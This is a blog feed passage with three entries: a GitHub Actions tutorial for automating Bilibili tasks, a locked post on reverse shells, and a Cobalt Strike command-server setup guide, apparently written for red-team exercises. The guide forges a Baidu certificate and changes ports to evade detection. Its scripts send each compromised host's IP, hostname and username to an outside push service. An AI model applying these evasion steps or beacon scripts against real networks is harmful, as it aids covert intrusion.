    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在 11月打 HW 的时候，遇到了一个靶标服务器二次渲染的文件上传点，因为之前没仔细研究没能拿到权限，还是有点遗憾的。而且 Getshell</summary>
      
    
    
    
    <category term="Note" scheme="https://www.lintstar.top/categories/Note/"/>
    
    
    <category term="Upload" scheme="https://www.lintstar.top/tags/Upload/"/>
    
    <category term="Vulnerability" scheme="https://www.lintstar.top/tags/Vulnerability/"/>
    
    <category term="Docker" scheme="https://www.lintstar.top/tags/Docker/"/>
    
    <category term="CTF" scheme="https://www.lintstar.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Github Action 实现自动升级 Bilibili Lv6</title>
    <link href="https://www.lintstar.top/2020/11/560e14cb.html"/>
    <id>https://www.lintstar.top/2020/11/560e14cb.html</id>
    <published>2020-11-28T14:16:58.000Z</published>
    <updated>2021-02-01T05:53:13.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>不知不觉已经是在B 站的第1003天了：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201129004250.png" alt="image-20201129004250821"></p><blockquote><p><strong>B 站进入创作中心右上角可以看到自己账号多久了哦 ~</strong></p></blockquote><p><strong>再看看我的等级：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201128172350.png" alt="image-20201128172350356"></p><p><strong>诶呦好惭愧 我怎么还没有成为6级大佬 🐶</strong></p><p><strong>恰巧今天偶然间翻到了这个：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201128172108.png" alt="image-20201128172108803"></p><p><strong>简介：</strong></p><blockquote><p><strong>这是一个利用 Linux Crontab , GitHub Action 等方式实现哔哩哔哩（Bilibili）每日任务投币，点赞，分享视频，直播签到，银瓜子兑换硬币，漫画每日签到，简单配置即可每日轻松获取 65 经验值，快来和我一起成为 Lv6 吧<del>~</del></strong></p></blockquote><p><strong>这六级不是指日可待嘛</strong></p><h1 id="BILIBILI-HELPER"><a href="#BILIBILI-HELPER" class="headerlink" title="BILIBILI-HELPER"></a>BILIBILI-HELPER</h1><p><strong>仓库地址：<a href="https://github.com/JunzhouLiu/BILIBILI-HELPER">https://github.com/JunzhouLiu/BILIBILI-HELPER</a></strong></p><p><strong>功能列表：</strong></p><ul><li>每天上午 9 点 10 分自动开始任务。<em>【运行时间可自定义】</em></li><li>哔哩哔哩漫画每日自动签到 。</li><li>每日自动从热门视频中随机观看 1 个视频，分享一个视频。</li><li>每日从热门视频中选取 5 个进行智能投币 <em>【如果投币不能获得经验，默认不投币】</em></li><li>投币支持下次一定啦，可自定义每日投币数量。<em>【如果检测到你已经投过币了，则不会投币】</em></li><li>大会员月底使用快到期的 B币券，给自己充电，一点也不会浪费哦，默认开启。<em>【可配置】</em></li><li>大会员月初 1 号自动领取每月 5 张 B币券 和福利。</li><li>每日哔哩哔哩直播自动签到，领取签到奖励。<em>【直播你可以不看，但是奖励咱们一定要领】</em></li><li>通过server酱推送执行结果到微信。</li><li>投币策略更新可配置投币喜好。<em>【可配置优先给关注的up投币】</em></li></ul><h1 id="开始部署"><a href="#开始部署" class="headerlink" title="开始部署"></a>开始部署</h1><blockquote><p><strong>部署过程中还做了一点点贡献 2333</strong></p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201128224359.png" alt="image-20201128224359715"></p><h1 id="Fork-仓库"><a href="#Fork-仓库" class="headerlink" title="Fork 仓库"></a>Fork 仓库</h1><p><strong>首先要把仓库 Fork 下来进一步配置</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201128225942.png" alt="image-20201128225942107"></p><h1 id="添加-Secrets"><a href="#添加-Secrets" class="headerlink" title="添加 Secrets"></a>添加 Secrets</h1><p><strong>首先登录 B 站：<a href="https://www.bilibili.com/">https://www.bilibili.com/</a></strong></p><p><strong>F12 Chrome 会弹出开发者工具 获取三个 Cookie 中的值：</strong></p><ul><li><strong>SESSDATA</strong></li><li><strong>BILI_JCT</strong></li><li><strong>DEDEUSERID</strong></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201128174104.png" alt="image-20201128174104442"></p><p><strong>添加到下图位置：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201128230531.png" alt="image-20201128230531578"></p><h1 id="配置自定义功能"><a href="#配置自定义功能" class="headerlink" title="配置自定义功能"></a>配置自定义功能</h1><p><strong>配置文件位于 <code>src/main/resources/config.json</code></strong></p><p><strong>参数示例</strong></p><table><thead><tr><th>Key</th><th>Value</th><th>说明</th></tr></thead><tbody><tr><td>numberOfCoins</td><td>[0,5]</td><td>每日投币数量，默认 5</td></tr><tr><td>selectLike</td><td>[0,1]</td><td>投币时是否点赞，默认 0  <code>0：否 </code> <code>1：是</code></td></tr><tr><td>monthEndAutoCharge</td><td>[false,true]</td><td>年度大会员月底是否用 B币券 给自己充电，默认 <code>true</code></td></tr><tr><td>devicePlatform</td><td>[ios,android]</td><td>手机端漫画签到时的平台，建议选择你设备的平台 ，默认 <code>ios</code></td></tr><tr><td>coinAddPriority</td><td>[0,1]</td><td>0：优先给热榜视频投币，1：优先给关注的up投币</td></tr><tr><td>userAgent</td><td>浏览器UA</td><td>用户可根据部署平台配置，可根据userAgent参数列表自由选取，如果触发了HTTP/1.1 412 Precondition Failed也请修改UA</td></tr></tbody></table><blockquote><p><strong>如果尝试给关注的 up 投币十次后（保不准关注的是年更up主），还没完成每日投币任务，则会切换成热榜模式，给热榜视频投币。</strong></p><p><strong>投币数量代码做了处理，如果本日投币不能获得经验了，则不会投币，每天只投能获得经验的硬币。</strong></p><p><strong>假设你设置每日投币 3 个，早上 7 点你自己投了 2 个硬币，则十点半时，程序只会投 1 个。</strong></p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201128232050.png" alt="image-20201128232050472"></p><h1 id="专属管家-Server-Chan"><a href="#专属管家-Server-Chan" class="headerlink" title="专属管家 Server Chan"></a>专属管家 Server Chan</h1><p><strong>在上面配置 Secrets 的地方新建变量 SERVERPUSHKEY</strong></p><p><strong>Github 一键登录 <a href="http://sc.ftqq.com/3.version">ServerChan</a> 复制自己的专属 Key</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201128233900.png" alt="image-20201128233900007"></p><h1 id="开启-Actions-设置每日自动执行"><a href="#开启-Actions-设置每日自动执行" class="headerlink" title="开启 Actions 设置每日自动执行"></a>开启 Actions 设置每日自动执行</h1><p><strong>Fork 仓库后，GitHub 默认不自动执行 Actions 任务</strong></p><p><strong>修改 <code>.github/trigger.json</code> 文件,将 <code>trigger</code> 的值改为 <code>1</code>，这样每天就会自动执行定时任务了。</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201128234920.png" alt="image-20201128234920534"></p><p><strong>修改每日任务执行的时间 位置在<code>.github/workflows/auto_task_bilili.yml</code> 第 11 行</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201129000316.png" alt="image-20201129000316255"></p><p> <strong><code>30 14 * * *</code> 表示每天晚上22点30执行</strong></p><p> <strong>crontab 表达式，Actions 时区是 UTC 时间，所以晚上10点要往前推8个小时。</strong></p><h1 id="crontab-定时任务"><a href="#crontab-定时任务" class="headerlink" title="crontab 定时任务"></a>crontab 定时任务</h1><p><strong>腾讯云函数、Github Action 甚至是反弹 Shell 都用得到的神器</strong></p><p><strong>编辑定时任务 填写的内容如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分 时 日 月 星期</span></span><br><span class="line">30 9 * * *</span><br></pre></td></tr></table></figure><p><strong>表示每天 9:30 自动执行</strong></p><h2 id="crontab-实例"><a href="#crontab-实例" class="headerlink" title="crontab 实例"></a>crontab 实例</h2><p><strong>实例1：每 1 分钟执行一次</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * *</span><br></pre></td></tr></table></figure><p><strong>实例2：每小时的第 3 和第 15 分钟执行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3,15 * * * *</span><br></pre></td></tr></table></figure><p><strong>实例3：在上午 8 点到 10 点的第 3 和第 15 分钟执行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3,15 8-10 * * * </span><br></pre></td></tr></table></figure><p><strong>实例4：每隔两天的上午 8 点到 10 点的第 3 和第 15 分钟执行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3,15 8-10 */2  *  *</span><br></pre></td></tr></table></figure><p><strong>实例5：每周六、周日的 8 : 10 执行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 8 * * 6,0 </span><br></pre></td></tr></table></figure><p><strong>实例6：每天 18 : 00 至 23 : 00 之间每隔 30 分钟执行一次</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0,30 18-23 * * * </span><br></pre></td></tr></table></figure><h1 id="Github-Action-执行工作流"><a href="#Github-Action-执行工作流" class="headerlink" title="Github Action 执行工作流"></a>Github Action 执行工作流</h1><p><strong>Github Actions 默认处于关闭状态，手动开启 Actions ，执行一次工作流，验证是否可以正常工作。</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201128234700.png" alt="image-20201128234700804"></p><p><strong>可以看到工作日志：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201128235647.png" alt="image-20201128235647419"></p><blockquote><p><strong>展开 <code>Build With Maven</code> 通过 <code>DEBUG</code> 标签快速过滤日志，查看运行状态</strong></p></blockquote><h1 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h1><p><strong>每天坐等65经验 从此快人一步</strong> 🚀 </p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201129002157.png" alt="image-20201129002157889"></p><blockquote><p><strong>“按照当前进度，升级到升级到Lv6还需要: 268天’’</strong></p></blockquote><p><strong>好漫长嗷  睡觉了 晚安  ~</strong> </p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201129002648.png" alt="image-20201129002647974"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;不知不觉已经是在B 站的第1003天了：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src= &quot;/img/loading.g</summary>
      
    
    
    
    <category term="Fun" scheme="https://www.lintstar.top/categories/Fun/"/>
    
    
    <category term="ServerChan" scheme="https://www.lintstar.top/tags/ServerChan/"/>
    
    <category term="GithubAction" scheme="https://www.lintstar.top/tags/GithubAction/"/>
    
    <category term="Bilibili" scheme="https://www.lintstar.top/tags/Bilibili/"/>
    
    <category term="Crontab" scheme="https://www.lintstar.top/tags/Crontab/"/>
    
  </entry>
  
  <entry>
    <title>记一次测试后各种方式反弹 Shell 总结</title>
    <link href="https://www.lintstar.top/2020/11/f4e7c088.html"/>
    <id>https://www.lintstar.top/2020/11/f4e7c088.html</id>
    <published>2020-11-27T11:16:58.000Z</published>
    <updated>2021-02-01T06:29:29.000Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">本文已加密 <br></label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="25eafbfe95bc7b2e748495a3d0cfc34a49d6cb6251a5f8276994a831d9013015"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="Note" scheme="https://www.lintstar.top/categories/Note/"/>
    
    <category term="Web" scheme="https://www.lintstar.top/categories/Note/Web/"/>
    
    
    <category term="Attack" scheme="https://www.lintstar.top/tags/Attack/"/>
    
    <category term="Crontab" scheme="https://www.lintstar.top/tags/Crontab/"/>
    
    <category term="Metasploit" scheme="https://www.lintstar.top/tags/Metasploit/"/>
    
    <category term="Shiro" scheme="https://www.lintstar.top/tags/Shiro/"/>
    
  </entry>
  
  <entry>
    <title>打造专属 Cobalt Strike</title>
    <link href="https://www.lintstar.top/2020/11/d200c39.html"/>
    <id>https://www.lintstar.top/2020/11/d200c39.html</id>
    <published>2020-11-20T15:49:59.000Z</published>
    <updated>2021-07-28T03:22:57.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><ul><li><strong>VPS</strong></li><li><strong>CentOS 8</strong></li><li><strong>CobaltStrike4.0</strong></li><li><strong>ServerChan SCKEY</strong></li></ul><h2 id="配置-VPS"><a href="#配置-VPS" class="headerlink" title="配置 VPS"></a>配置 VPS</h2><ol><li><strong>使用dnf安装常用软件</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnf install vim net-tools wget –y</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>修改主机名</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Catherine&#x27;</span> &gt;/etc/hostname</span><br><span class="line">hostname `cat /etc/hostname`</span><br><span class="line">bash</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>DNF/YUM源配置文件替换为阿里源</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo</span><br><span class="line">yum -y install wget</span><br><span class="line"><span class="comment"># 查看是否修改成功</span></span><br><span class="line">cat /etc/yum.repos.d/CentOS-Base.repo</span><br><span class="line"><span class="comment"># 生成缓存</span></span><br><span class="line">yum makecache</span><br><span class="line"><span class="comment"># 升级软件包</span></span><br><span class="line">yum -y update</span><br><span class="line">dnf -y update</span><br></pre></td></tr></table></figure><blockquote><p><strong>DNF是Linux上的下一代包管理工具，它替换的对象是YUM</strong><br>参考链接：<a href="https://blog.csdn.net/dengshulei/article/details/103704285">https://blog.csdn.net/dengshulei/article/details/103704285</a></p></blockquote><h2 id="安装-Java环境"><a href="#安装-Java环境" class="headerlink" title="安装 Java环境"></a>安装 Java环境</h2><p><strong>安装 jdk1.8</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install java-1.8.0-openjdk* -y</span><br></pre></td></tr></table></figure><p><strong>卸载</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查系统是否自带 jdk</span></span><br><span class="line">rpm -qa |grep java</span><br><span class="line">rpm -qa |grep jdk</span><br><span class="line">rpm -qa |grep gcj</span><br><span class="line"><span class="comment"># 如果有输出信息，批量卸载系统自带</span></span><br><span class="line">rpm -qa | grep java | xargs rpm -e --nodeps</span><br></pre></td></tr></table></figure><p><strong>查看 Java 版本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@Catherine ~]<span class="comment"># java -version</span></span><br><span class="line">openjdk version <span class="string">&quot;1.8.0_272&quot;</span></span><br><span class="line">OpenJDK Runtime Environment (build 1.8.0_272-b10)</span><br><span class="line">OpenJDK 64-Bit Server VM (build 25.272-b10, mixed mode)</span><br></pre></td></tr></table></figure><hr><h1 id="配置CobaltStrike"><a href="#配置CobaltStrike" class="headerlink" title="配置CobaltStrike"></a>配置CobaltStrike</h1><p>Cobalt Strike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。由于使用的cobalt strike版本是4.0，所以要求使用 Oracle Java 1.8，JDK 11。</p><h2 id="启动服务端-CobaltStrike"><a href="#启动服务端-CobaltStrike" class="headerlink" title="启动服务端 CobaltStrike"></a>启动服务端 CobaltStrike</h2><p><strong>进入到CS目录下，把 teamserver 赋予最高权限:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 777 teamserver</span><br></pre></td></tr></table></figure><p><strong>执行teamserver并设置ip、密码：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@Catherine CS4.0]<span class="comment"># ./teamserver xx.xxx.xx.xxx ******</span></span><br><span class="line">[*] Will use existing X509 certificate and keystore (<span class="keyword">for</span> SSL)</span><br><span class="line">[+] Team server is up on 50050</span><br><span class="line">[*] SHA256 <span class="built_in">hash</span> of SSL cert is: *****...</span><br></pre></td></tr></table></figure><p><strong>连接成功：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201120213944.png" alt="image-20201120213937821"></p><h2 id="端口特征"><a href="#端口特征" class="headerlink" title="端口特征"></a>端口特征</h2><p>进入 cobaltstrike 的目录，执行<code>nano teamserver</code>，找到 <code>server_port</code>（默认是 50050）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># start the team server.</span><br><span class="line">java -XX:ParallelGCThreads=<span class="number">4</span> -Dcobaltstrike.server_port=<span class="number">50022</span> -Djavax.net.ssl.keyStore=./c$</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201120215340.png" alt="image-20201120215340271"></p><h2 id="证书特征"><a href="#证书特征" class="headerlink" title="证书特征"></a>证书特征</h2><p>Keystore 是 java 的密钥库，用来进行通信加密，如数字签名。keystore 就是用来保存密钥对的公钥和私钥。 Keystore 可理解为一个数据库，可以存放很多个组数据。</p><p>每组数据主要包含以下两种数据:</p><ul><li>密钥实体 —- 密钥(secret key)又或者私钥和配对公钥(采用非对称加密)</li><li>可信任的证书实体 —- 只包含共钥</li></ul><p>查看CobaltStrike的默认store文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store</span><br></pre></td></tr></table></figure><blockquote><p>密码是123456</p></blockquote><p>直接访问CobaltStrike服务器的端口，也可以看到证书信息:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://192.168.106.5:50050 -v -k</span><br></pre></td></tr></table></figure><h2 id="修改服务端证书CobaltStrike-store"><a href="#修改服务端证书CobaltStrike-store" class="headerlink" title="修改服务端证书CobaltStrike.store"></a>修改服务端证书CobaltStrike.store</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass 密码 -keypass 密码 -genkey -keyalg RSA -<span class="built_in">alias</span> google.com -dname <span class="string">&quot;CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)&quot;</span></span><br></pre></td></tr></table></figure><p><strong>keytool 用法</strong></p><ul><li>-alias 指定别名</li><li>-storepass pass 和 -keypass pass 指定密钥</li><li>-keyalg 指定算法</li><li>-dname 指定所有者信息</li></ul><p>先删除 CobaltStrike 自带的 cobaltstrike.store，然后使用以下命令生成一个新的 cobaltstrike.store 即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -<span class="built_in">alias</span> baidu -dname <span class="string">&quot;CN=baidu.com, OU=service operation department, O=Beijing Baidu Netcom Science Technology Co.\, Ltd, L=beijing, S=beijing, C=CN&quot;</span></span><br><span class="line"></span><br><span class="line">Warning:</span><br><span class="line">The JKS keystore uses a proprietary format. It is recommended to migrate to PKCS12 <span class="built_in">which</span> is an industry standard format using <span class="string">&quot;keytool -importkeystore -srckeystore ./cobaltstrike.store -destkeystore ./cobaltstrike.store -deststoretype pkcs12&quot;</span>.</span><br></pre></td></tr></table></figure><p><strong>ctrl + x 退出时根据提示保存</strong></p><blockquote><p><strong>详见：</strong><a href="http://www.feidao.site/wordpress/index.php/2020/10/26/cobaltstrike-duo/#toc-head-1"><strong>CobaltStrike流量规避</strong></a></p></blockquote><h3 id="修改Cobalt-Strike-dns-idle"><a href="#修改Cobalt-Strike-dns-idle" class="headerlink" title="修改Cobalt Strike dns_idle"></a>修改Cobalt Strike dns_idle</h3><p>0.0.0.0是Cobalt Strike DNS Beacon特征可设置Malleable C2进行修改 输入set dns_idle “8.8.8.8”</p><h2 id="设置后台挂载-CobaltStrike"><a href="#设置后台挂载-CobaltStrike" class="headerlink" title="设置后台挂载 CobaltStrike"></a>设置后台挂载 CobaltStrike</h2><p><strong>每次断开ssh时，cs服务端的teamserver命令就会结束，因此需要一个挂载到后台运行的进程工具</strong></p><ol><li><strong>首先安装screen:  <code>apt-get install screen</code></strong></li><li><strong>然后直接键入screen，回车进入一个新的窗口</strong></li><li><strong>再运行启动 teamserver 命令</strong></li><li><strong>按组合键Ctrl+a+d关闭窗口并后台执行，可以看到进程在后台运行，断开SSH连接也不受影响</strong></li></ol><p><strong>查询进程：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@Catherine CS4.0]<span class="comment"># ps aux | grep teamserver</span></span><br><span class="line">[root@Catherine CS4.0]<span class="comment"># ps -a</span></span><br><span class="line">    PID TTY          TIME CMD</span><br><span class="line"> 811265 pts/6    00:00:00 teamserver</span><br><span class="line"> 811268 pts/6    00:00:03 java</span><br><span class="line"> 812100 pts/5    00:00:00 ps</span><br></pre></td></tr></table></figure><hr><h1 id="专属管家-ServerChan"><a href="#专属管家-ServerChan" class="headerlink" title="专属管家 ServerChan"></a>专属管家 ServerChan</h1><blockquote><p><strong>Server酱是什么「Server酱」，英文名「ServerChan」，是一款「程序员」和「服务器」之间的通信软件。说人话？就是从服务器推报警和日志到手机的工具。</strong></p><p><strong>开通并使用上它，只需要一分钟：登入：用GitHub账号登入网站，就能获得一个SCKEY（在「发送消息」页面）绑定：点击「微信推送」，扫码关注同时即可完成绑定发消息：往 <a href="http://sc.ftqq.com/SCKEY.send">http://sc.ftqq.com/SCKEY.send</a> 发GET请求，就可以在微信里收到消息啦</strong></p></blockquote><h2 id="Cna脚本"><a href="#Cna脚本" class="headerlink" title="Cna脚本"></a>Cna脚本</h2><p><strong>命名为 Cs_ServerChan.cna</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">on beacon_initial &#123;</span><br><span class="line">        println(<span class="string">&quot;Initial Beacon Checkin: &quot;</span> . <span class="variable">$1</span> . <span class="string">&quot; PID: &quot;</span> . beacon_info(<span class="variable">$1</span>,<span class="string">&quot;pid&quot;</span>));</span><br><span class="line">        <span class="built_in">local</span>(<span class="string">&#x27;$internalIP $computerName $userName&#x27;</span>);</span><br><span class="line">        <span class="variable">$internalIP</span> = replace(beacon_info(<span class="variable">$1</span>,<span class="string">&quot;internal&quot;</span>),<span class="string">&quot; &quot;</span>,<span class="string">&quot;_&quot;</span>);</span><br><span class="line">        <span class="variable">$computerName</span> = replace(beacon_info(<span class="variable">$1</span>,<span class="string">&quot;computer&quot;</span>),<span class="string">&quot; &quot;</span>,<span class="string">&quot;_&quot;</span>);</span><br><span class="line">        <span class="variable">$userName</span> = replace(beacon_info(<span class="variable">$1</span>,<span class="string">&quot;user&quot;</span>),<span class="string">&quot; &quot;</span>,<span class="string">&quot;_&quot;</span>);</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&#x27;python3 /root/Tools/CS4.0/ServerChan/ServerChan.py&#x27;</span> . <span class="string">&quot; --computernam &quot;</span> . <span class="variable">$computerName</span> . <span class="string">&quot; --internalip &quot;</span> . <span class="variable">$internalIP</span> . <span class="string">&quot; --username &quot;</span> . <span class="variable">$userName</span>;</span><br><span class="line">        println(<span class="string">&quot;Sending server: &quot;</span> . <span class="variable">$cmd</span>);</span><br><span class="line">        <span class="built_in">exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Python-脚本"><a href="#Python-脚本" class="headerlink" title="Python 脚本"></a>Python 脚本</h2><p><strong>命名为 ServerChan.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">ser_key = <span class="string">&#x27;SCU117922***************************&#x27;</span> <span class="comment">#自己的Server酱 SCKEY</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Beacon Info&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--computername&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--internalip&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--username&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">computername = args.computername</span><br><span class="line">internalip = args.internalip</span><br><span class="line">username = args.username</span><br><span class="line"></span><br><span class="line">ran_str = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">title = <span class="string">&quot;Catherine 上线提醒&quot;</span></span><br><span class="line">content = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**您有新主机上线啦 ！**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**IP: &#123;&#125;**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**主机名: &#123;&#125;**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**用户名: &#123;&#125;**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**Token: &#123;&#125;**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**请注意查收哦 ~**</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.format(internalip, computername, username, ran_str)</span><br><span class="line"></span><br><span class="line">resp = requests.post(<span class="string">&quot;https://sc.ftqq.com/&#123;&#125;.send&quot;</span>.format(ser_key),</span><br><span 